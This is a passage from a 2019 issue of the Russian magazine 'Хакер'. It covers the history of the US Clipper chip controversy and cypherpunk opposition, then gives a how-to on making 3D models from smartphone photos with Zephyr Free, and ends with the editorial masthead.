ности общественности по поводу Clipper, однако именно она спровоцирова‐
ла волну скоординированной активности со стороны раз ных групп. В оппо‐
зицию входили борцы за приватность, техничес кие эксперты, академи ки,
хакеры и лидеры отрасли. Спустя нес колько недель после официального
анонса Clipper Ассоциация производителей компь ютеров и оргтехники, вклю‐
чавшая в себя 26 крупнейших компь ютер ных компаний США, вслед за NIST
раскритиковала экономичес кую жизнеспособность Clipper.
  Самой же интересной группой оппозиционеров стало движение шиф‐
ропанков (Cypherpunks). Это сооб щес тво переписыва лось (и, по сути, сущес‐
твовало) в одноименной почтовой рас сылке. Она была запущена в 1992 году
и через два года имела око ло 700 подписчиков. Здесь обсуждалась матема‐
тика, криптография, программирование, а также политика и философ ские
вопросы.
  Идеология шифропанков, которую они окрестили криптоанархизмом, гла‐
сила, что надежное шифрование — это ключ к личной свободе, а развитие
связанных с ним технологий рано или поз дно сделает государства ненуж‐
ными. Неудивительно, что Clipper и АНБ для этой группы были врагами номер
один.
  Среди известных шифропанков: Джу лиан Ассанж, разработчик Tor Джей‐
коб Эпплбаум, автор про токола BitTorrent Брэм Коэн, создатель Signal Мокси
Марлинспайк, создатель Bit Gold (предшественника Bitcoin) Ник Сабо и мно‐
гие другие знаменитости, включая, конечно, уже упо мяну тых Уитфилда Диффи
и Брю са Шнайера. Более полный их список ты найдешь в «Википе дии».


        WWW

                  •Архив рассылки шифропанков на сайте Cryp‐
                           toanarchy Wiki и в виде архива ZIP на сайте
                          Сryptome.org
                  •«Шифрономикон» — официальный FAQ шиф‐
                        ропанков
                    •Архивная версия сайта Cypherpunks.to
                  •Книга Джулиана Ассанжа  «Cypherpunks: сво‐
                        бода и будущее интернета»
                  •Книга This Machine Kills Secrets Энди Гринберга
                  •Роман  Нила  Стивенсона   «Крип тономикон»,
                         вдохновленный деятельностью шифропанков


В числе прочего шифропанки призыва ли бойкотировать AT&T, которая сог‐
ласилась вставить Clipper в свой новый телефон с шифрованием. Постепенно
к публичной кампании шифропанков против Clipper присоединился широкий
круг частных и юридичес ких лиц.
  Видя явную угрозу праву на неприкосновенность частной жизни, зарож‐
дающиеся группы «Фонд электронных рубежей» (EFF) и «Центр электрон ной
частной информации»  (EPIC) тоже подключились к борьбе против Clipper
(см., к примеру, бюллетень EFF за апрель 1993 года). Они организовывали
панельные дискуссии с экспертами, общались с конгрессом и распростра‐
няли электронные петиции. Одна из их петиций собрала больше 50 тысяч
подписей. Беспрецедентно в ранние дни интернета!
  Координацию всей этой деятельнос ти взя ло на себя еще одно сообщес‐
тво оппозиционеров — Ассо циация компь ютер ных профессионалов за соци‐
альную ответственность (CPSR). Нап ример, в январе 1994 года чле ны CPSR
подготовили  письмо администра ции  Клинтона  с  призывом  отказаться
от Clipper.
   Этот текст подписали более тридцати ведущих криптографов, экспертов
по безопасности и борцов за приватность. Среди подписавшихся были мно‐
гие из отцов‐основателей пуб личной криптогра фии: Уитфилд Диффи, Мартин
Хел лман, Рональд Ривест, Фил Циммерман, Ральф Меркл и другие авторите‐
ты.
  Наконец, к оппозиции присоединился ряд видных политиков — как демок‐
ратов, так и республиканцев. Сенатор Патрик Лихи, один из самых ярых кри‐
тиков «Клиппера», призывал АНБ задаться вопросом об эффективности чипа,
учитывая существование таких альтернатив, как PGP. «Сомневаюсь, что прес‐
тупники будут пользовать ся теми шифрами, от которых у правительства есть
клю чи, когда в продаже имеется множество альтернативных методов шиф‐
рования», — сказал он на слушаниях в 1994 году.


ПЕРВЫЕ ШАГИ НА ПУТИ К ОТКАЗУ ОТ «КЛИППЕРА»
Несмотря на растущую оппозицию, спецслужбы не спешили отказаться
от своей задумки. В феврале 1994 года правитель ство США официально
приняло технологию Clipper в качес тве федераль ного стандарта обработки
информации: «Стандарт шифрования с депонированием ключей» (EES).
Естественно, скептически нас троенная пуб лика не была довольна. В мар‐
те 1994 года, согласно опросу CNN и TIME, 80% американцев выступили про‐
тив «Клиппера». Очевидно, пиар‐активность оппо зиции не прошла даром.
  Правительству пришлось разворачи вать встречную пиар‐кампанию. Глав‐
ный советник АНБ Стюарт Бейкер опубликовал статью в журнале Wired: «Не
переживай и будь счастлив: почему Clipper полезен для тебя». Дороти Ден‐
нинг тоже пошла в наступление: писала журналь ные статьи и обзоры, осуждая
самых видных критиков Clipper. По факту она стала самым ярым защитником
позиции АНБ.
  Однако в ито ге АНБ проигра ло. Оппозиция таки смогла отстоять свое пра‐
во на надежное шифрование без «Клиппера». Пос ледний гвоздь в крышку
гроба Clipper и Skipjack был забит в мае 1994 года Мэттом Блейзом из AT&T
Bell Laboratories. Он представил на конференции ACM CCS ‘94 отчет о нес‐
кольких потенциальных уязвимос тях Clipper (PDF).
  Найденная проб лема сводится к следующему. Чип передает устрой‐
ству 128‐битное поле Law Enforcement Access Field (LEAF), которое содержит
информацию, необ ходимую для вос ста новления ключа шифрования. Прог‐
рамма, которая отправляет сообщение, защищена от работы с поддельным
LEAF при помощи 16‐битного хеша: сооб щения с неверным хешем не будут
расшифрованы. Однако длина хеша недостаточно велика, чтобы служить
серьезной преградой в будущем. При помощи брутфорса в теории можно
получить новое значение LEAF, которое будет давать тот же хеш. Это поз‐
волило бы использовать Clipper для шифрования без посредничес тва треть‐
ей стороны (то есть правитель ственных орга нов).
  Но даже проиграв, АНБ не думало сда вать ся. После фиаско 1994 года
спецслужбы так и не отказались от своих попыток держать криптографию
под  контролем. Правда,  нес колько  видоизменили  тактику:  взяли  курс
на условное депонирование ключей.
  В чем разница с обычным депонирова нием, которое АНБ пыталось внед‐
рить до этого? Суть условного депонирования в том, что «ключ» к каждому
устройству будут хранить не правитель ственные спецслужбы, а сертифици‐
рованная спецслужбами третья сторона.
  Но и новая схема в конце концов тоже провалилась. Проблемы конфиден‐
циальности, безопасности и экономические издержки продол жали пре‐
вышать любые потенциальные выгоды. К 1997 году было сформулировано
огромное количество аргу ментов, подтвержда ющих, что развитие «условного
депонирования ключей» совершенно бесперспективно (ты можешь найти их
в книге Джампьеро Джакомелло National Governments and Control of the Inter‐
net: A Digital Challenge).
  В 1996 году Национальный исследовательский совет США (NRC) опуб‐
ликовал 700‐страничный отчет, в котором разоб раны проблемы попытки
ограничить распростра нение надеж ного шифрования. В конце 1997 года ту
же идею поддержала в сво ем техническом отчете Еврокомиссия.
  Окончательно добил идею условно го депонирова ния ключей технический
отчет за подписью десятка технических экспертов. Имена все уже знакомые:
Мэтт Блейз, Уитфилд Диффи, Брюс Шнайер и дру гие.


НА ПОРОГЕ КРИПТОВОЙНЫ 2.0
Прогнозы активистов о том, что надежное шифрование принесет пользу эко‐
номике, укрепит безопас ность интернета и защитит гражданские свободы,
сбылись в полной мере. Появление основопо лага ющих технологий, таких
как SSL и SSH, позволило реализовать электронные банковские системы,
системы обработки электронных медицин ских карт, онлай новые инс трументы
оплаты счетов, системы домаш ней автоматизации, системы электронной
передачи налого вой отчетности, VPN и многие дру гие полезные вещи.
  Со времен «Клиппера» надежное шифрование стало гораз до доступнее,
но спецслужбы продол жают попытки препятс твовать его распространению.
Перипетии первой криптовойны потихоньку забываются, а достигнутые сво‐
боды снова под угрозой.
   Чтобы обосновать свою точку зрения, сот рудники спецслужб возродили
многие из тех аргументов, которые выдвигались в девяностых годах (они под‐
робно перечислены, например, в докладе акти виста Кевина Бэнкстона, PDF).
  В 2013 году благодаря WikiLeaks была рас крыта информация о широко
распространенных программах наблюдения АНБ. И вот приватность, защита
личных данных и связанные с этим проблемы сно ва в центре внимания
общественности.
  «Мы рекомен дуем оказывать всестороннюю поддержку созданию и рас‐
пространению стандартов шифрования и уж тем более не подрывать данные
инициативы», — говорит ся в отчете (PDF) ана литической группы при пре‐
зиденте США. Она создана после откровений Сноудена в 2013 году и приз‐
вана оценить деятельность АНБ, затрагивающую приватность граждан. Но к
какой стороне прислуша ются влас ти, пока неясно.
GEEK

 3D-СКАНИРОВАНИЕ
  БЕЗ 3D-СКАНЕРА





                                      Валентин Холмогоров
                                                 valentin@holmogorov.ru




            КАК ПОЛУЧИТЬ
        ТРЕХМЕРНУЮ МОДЕЛЬ
      ПРИ ПОМОЩИ СМАРТФОНА





Как и у любого человека, увлекающегося 3D‐печатью, у меня
периодичес ки   возникает   необходимость   превратить
какой‐нибудь материальный предмет в виртуальную объ‐
емную модель для последующей отправки на принтер.
В онлайн‐каталогах вроде Thingiverse можно найти далеко
не все, а рисовать сложную деталь в 3D‐редакторе — долго
и муторно. Казалось бы, решение проблемы — 3D‐сканер,
но он не всегда имеется под рукой. Можно ли обойтись
и вовсе без этого хитроумного устройства? Оказывается,
можно! Для этого вполне достаточно обыч ной цифровой
фотокамеры или смартфона.


СУТЬ МЕТОДА
Способ получе ния трехмерной модели с помощью цифрового фотоаппарата
называется фотограмметрией. Под этим термином понимается опре деление
формы, размеров, положения и иных характеристик объ ектов по их изоб‐
ражениям. Фотограмметрия широко используется там, где предмет физичес‐
ки невозможно запих нуть в 3D‐сканер, например при съемке архитектурных
объектов или при аэрофотосъемке для пос троения объ емных изображений
ландшафта  земной  поверхности.  Слона  таким  образом  оцифровать
не получится — объект должен быть неподвижен. Пользуются фотограммет‐
рией и 3D‐моделисты, не желающие тратиться на покупку спе циального обо‐
рудования.
  Фотограмметрия исполь зует методы оптики и проективной геометрии,
чтобы точно определить каждую точку поверхнос ти исследуемого объекта
и воссоздать его трехмерную модель по двумерному изображению. Происхо‐
дит это так. Специальные прог раммы обрабатывают набор фотоснимков
одного и того же объекта, сделанных с раз ных ракурсов. При этом необ‐
ходимо, чтобы на нескольких фотографиях при сутствовали общие элементы
снимаемого объекта, то есть каж дый его участок должен быть запечатлен
как минимум на трех фото. Вращать объект, как это делается при исполь‐
зовании 3D‐сканеров, в этом случае не следует, пос кольку при вращении
меняется его освещенность. Вместо это го, наоборот, нужно перемещаться
вместе с камерой вокруг ска ниру емого предмета. Результатом программно‐
го анализа снимков становится цифровая трехмерная модель, которую потом
можно загрузить в 3D‐редактор для последу ющей обработки.
   Этот метод хорош для тех владельцев 3D‐прин теров, которые пока еще не
освоили работу в профес сиональных трехмерных редакторах, но желают
изготовить из пластика какое‐то полезное изделие. В этом слу чае его можно
будет вылепить, например, из пластилина, причем в большем масштабе —
так можно получить довольно мелкие детали, отсканировать, а затем отпра‐
вить на печать. Правда, полученная объемная модель все равно будет иметь
изъяны, поэтому ее придет ся немного «подправить» в соответству ющих прог‐
раммах вроде бесплатных Meshmixer или MeshLab.


ЖЕЛЕЗО
Для получения трехмерной модели методом фотограмметрии подойдет
любая цифровая камера. Очевидно, что профессиональные зеркалки дают
заметно лучший результат просто в силу более качественной оптики. Кроме
того, такие фотоаппараты поз воляют импортировать снимки в «сыром» фор‐
мате RAW, то есть без сжа тия, что дает определенное преиму щество
при обработке изоб ражения, поскольку при сжатии графики неиз бежны
потери. Но в целом для достижения приемлемого результата вполне дос‐
таточно камеры, которой обо рудованы практически все современные смар‐
тфоны, при условии, что сам объектив камеры не имеет физических пов‐
реждений и дефектов. Общий принцип тут таков: чем больше раз решение
полученных снимков, тем выше будет качество трехмерной модели, но тем
больше времени потребуется на программную обработку кадров.
  Экшен‐камеры  вроде  GoPro  для  целей  фотограмметрии  подходят
не очень хорошо, поскольку большинство из них оборудованы объективами
типа «рыбий глаз», которые вносят искажения в полученное такой камерой
изображение. Этим сводятся на нет все преиму щества подобных устрой ств.
  Именно поэтому в качес тве устройства для получения изображений вмес‐
то экшен‐камеры впол не можно использовать обычную веб‐камеру, благо
именно они и лежат в осно ве большинства бюджетных 3D‐сканеров. Качество
полученной таким образом покадровой съемки будет, честно говоря, так
себе, зато подоб ным способом мож но снимать достаточно большие объ‐
екты — например, архитектурные соору жения или автомобили.


ОГРАНИЧЕНИЯ
Очевидно, что с использованием метода фотог рамметрии можно получить
качественную 3D‐модель далеко не вся кого объекта. При помощи цифрового
фотоаппарата не получится отска ниро вать следующие предметы:
 • прозрачные объекты;
 • объекты, имеющие поверхность с высокой отражающей способностью,
   например зеркальные или хромированные;
 • очень маленькие предметы;
 • предметы, поверхность  которых имеет  большое  количество мел ких
   деталей, выступов и выемок, либо объекты очень сложной формы.

Чрезвычайно плохо получа ются модели однотонных предметов с очень глад‐
кой и ровной поверхностью, потому что в этом случае программе будет не к
чему «привязаться» при обсчете объемной фигуры. Кроме того, объект,
безусловно, должен располагаться перед объ екти вом камеры совершенно
неподвижно. Качественно отсканировать движущийся объ ект не получится.


ПРИСТУПАЕМ К СЪЕМКЕ
Перед  началом  съемки  необ ходимо  поместить  сканируемый  предмет
на какую‐нибудь подставку или закрепить на штативе. Его нужно жестко
зафиксировать, чтобы объект не перемещался и не болтался на своем осно‐
вании. Можно, например, закрепить его на подставке кусочком пластилина —
причем этот кусочек должен быть дос таточно большим, чтобы предмет
не перекосило или он не завалился набок во время съемки. Объ ект лучше
всего установить на отдельно стоящем табурете или столе, вокруг которого
можно беспрепятственно обойти с камерой в руках.
  Следует позабо титься и об освещении: свет должен падать на снимаемую
сцену равномерно, не оставляя на объекте бликов или сильно затененных
участков. Лучше всего фотографировать предмет на улице в пасмурный день,
но подойдет и обыч ный дневной свет в помещении либо рассеянный свет
люминесцентных ламп. Не нужно направлять источни ки света непос редствен‐
но на объект, лучше ориентировать их на белый потолок или вос пользоваться
светорассеивателями. Важ но, чтобы на предмете отсутствовали рез кие
затенения. Располагай источники света выше модели, чтобы прямые лучи
не попадали в объектив. Вспышку на камере следует отключить — она даст
ненужные блики.
  Запомни начальную точку съемки — она же ста нет и конечной точкой,
на которой ты дол жен будешь завершить обход объекта. Старайся настроить
фотоаппарат так, чтобы фотографируемый предмет по возможности занимал
весь кадр, но при этом полностью в него помещал ся, не «вылезая» за его
пределы. Переключи камеру в ручной режим съемки — в автомати ческом
режиме она будет постоянно перенас траивать экспозицию, баланс белого
и прочие параметры, чего нам следует по воз можнос ти избегать. Единс твен‐
ный автоматический параметр, который можно оставить включенным, —
автофокусировка: хороший фокус — это залог успеха всего мероприятия.
Выставив все необ ходимые нас тройки в самом начале съемок, больше
не меняй их.
  Обходим вокруг сканиру емого предмета с камерой в  руках, делая
не менее пятидесяти снимков таким обра зом, чтобы каждый последующий
захватывал часть экспозиции предыдущего. Твоя траектория движения дол‐
жна составлять по возможнос ти ровную окружность. Во время первого про‐
хода старайся держать камеру пример но на одном уровне по отношению
к объекту, чтобы на полученных фотографиях предмет рас полагался на одной
высоте, затем можно сделать снимки немного под углом сверху или снизу,
обойдя модель по кругу еще несколько раз. Можно использовать штатив,
но это увеличит время съемки, поэто му лучше всего работать, что называ‐
ется, «с рук»: сделал кадр, переместился на нес колько сантиметров, сделал
новый кадр и так далее.





        Каждый новый кадр должен содержать часть предыдущего

Порядок фотографий для большинс тва приложений не име ет решающего
значения, поэтому, сделав несколько снимков, можно вернуться немного
назад и получить еще пару кадров с предыдущей точки. Важно лишь следить
за тем, чтобы каждый новый кадр перекрывал примерно 60–70% экспозиции
предыдущего. Фон, на котором расположен предмет, тоже не играет сущес‐
твенной роли: луч ше, если он как раз будет неоднород ным, чтобы программе
было легче «привязаться к мес тности». Тогда она сможет опре делить рас‐
положение различных учас тков предмета относительно друг друга и окру‐
жающего пространства. Очень важно, что бы фон отличал ся по цвету от цвета
самой модели.
  Чем больше будет исходных снимков для обработки, тем лучше, поэтому
их стоит делать с запасом. Уда лить лишние кадры никогда не поздно, а вот
нащелкать новые — уже проблематично, особенно если ты убрал фотог‐
рафируемый объект с подставки: в этом случае уста новить его обратно в точ‐
ности так же, как он стоял до это го, миллиметр в миллиметр, будет уже невоз‐
можно. Не применяй к исходным снимкам фильтры: это увеличит «цифровой
шум» картинки, но никак не улучшит ее с точки зрения ПО.


ПРОГРАММНОЕ ОБЕСПЕЧЕНИЕ
Самая известная программа для преобра зова ния фотографий в 3D‐модель
называется Zephyr Free, ее мож но скачать с сайта раз работчиков. Бесплатная
версия Zephyr имеет огра ничение: в нее можно загрузить только 50 фотог‐
рафий для одного проекта, но даже с таким небольшим количеством кадров
приложение позволяет получить вполне прилич ный результат.
  После установ ки и запус ка приложения Zephyr Free открой меню Workflow
и выбери в нем пункт New Project. Затем перетащи в окно программы все
сделанные фотографии объекта либо импортируй их вручную, нажав на кноп‐
ку + и открыв папку, где хранятся файлы.
  Выбрав фотографии, дважды щелкни мышью на кнопке Next. Теперь
в меню Category нужно выбрать один из четырех вариантов позици они рова‐
ния камеры и снимаемого объекта: Aerial — для снимков с воздуха, нап‐
ример с коптера, Close Range — для неболь ших предметов, снятых вблизи,
Human Body — снимки человеческого тела и, наконец, Urban — для съемок
городских объектов и архитектурных сооружений. В нашем случае лучше все‐
го подходит второй вариант, Close Range.
  Ниже располагается меню Presets, где предлагаются три возможные
настройки приложения: Fast (быстрое пос троение модели), Default (по
умолчанию) и Deep (глубокий ана лиз). Для более высокого качес тва получен‐
ной модели лучше всего выбрать вариант Deep. Снова нажимаем Next
а затем кнопку Run в верхней части окна, чтобы запус тить процесс преобра‐
зования фотографий в трехмерную модель.
  На первом этапе Zephyr Free проана лизи рует все загруженные тобой
снимки,  найдет  отличия между ними  и  покажет  список  фотографий,
на которых ей точно уда лось определить местоположение камеры и сни‐
маемого объекта. Пригодные для работы снимки будут помечены в списке
словом Yes, неудачные — крас ной надписью No.





         Результат анализа фотографий программой Zephyr Free

Если для построения трехмерной модели подошло слишком мало картинок,
съемку и все последующие процеду ры придет ся повторить. Лично у меня
нормально отснять объект получилось примерно с восьмого раза. Если
результат тебя устраивает, щелкни мышью на кнопке Finish, чтобы прос‐
мотреть на экране облако точек, которое пос троила программа на основании
загруженных фотог рафий.





             Так выглядит созданное Zephyr Free облако точек

Чтобы создать более плотное облако точек, щелкни мышью на кнопке Dense
Point Cloud Generation и нажми на клавишу Next. В следующем окне нам
также нужно будет выбрать в верхнем меню режим Close Range, а в ниж‐
нем — High Details. Опять нажмем Next, а затем — Run.
  Сборка облака точек займет довольно продолжительное время, но в итоге
мы  получим изоб ражение сфотографированного объ екта, уже больше
похожее на  трехмерную модель. Помимо самого объ екта,  программа
соберет много посторонних точек, которые также включит в облако.
   Лучше удалить посторонние объекты сра зу, до того как они будут импорти‐
рованы вместе с моделью в 3D‐редактор. Для этого, прокручивая колесо
мыши, нужно максимально отдалить обла ко точек, открыть вкладку Editing
в правой части окна и нажать на кнопку By Hand. Затем, выделяя мышью
области «лишних» точек и нажимая на клавишу Del, сле дует акку ратно убрать
все посторонние объекты вокруг модели.
  С помощью инструмента Poly («лас со») мож но убрать лишние точки
с поверхности самой модели, поворачивая ее при помощи мыши.





     С помощью инстру мента «лас со» можно убрать лишние точки

Когда все готово, нажимаем на кнопку Mesh Extraction. В открывшемся
окне выбираем настройки, идентичные предыду щим, нажимаем кнопку Next,
а затем — Run. Следующий этап — сделать из полученного объ екта модель
с текстурами. Для этого вос пользуемся кнопкой Textured Mesh Generation.
В открывшемся окне мож но оста вить все предложенные нас тройки по умол‐
чанию. Снова нажимаем Next и Run. Через несколько минут модель будет
готова.


ИТОГ
Теперь нам осталось только экспортировать полученную объ емную модель
в формат, пригодный для обработки в редакторе Meshmixer или MeshLab.
Для этого воспользуемся кноп кой Export Textured Mesh. В окне экспорта
выбираем формат OBJ, после чего нажимаем на кнопку Export. Сохранен‐
ный таким образом файл можно импорти ровать в Meshmixer для пос леду‐
ющей конвертации модели в формат STL, пригодный для печати на 3D‐прин‐
тере.
   №06 (243)
          Андрей Пись мен ный        Илья Русанен          Алексей Глазков
              Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                           РЕДАКТОРЫ РУБРИК
          Андрей Пись мен ный        Илья Русанен        Иван «aLLy» Андреев
               pismenny@glc.ru             rusanen@glc.ru         iam@russiansecurity.expert
            Евгений Зобнин          Татьяна Чупрова        Андрей Васильков
                 zobnin@glc.ru              chuprova@glc.ru        the.angstroem@gmail.com
                   Вален тин Холмогоров     Виктор Олейников
                           valentin@holmogorov.ru     fabulous.faberge@yandex.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                               РЕКЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по под писке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязатель но совпада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2019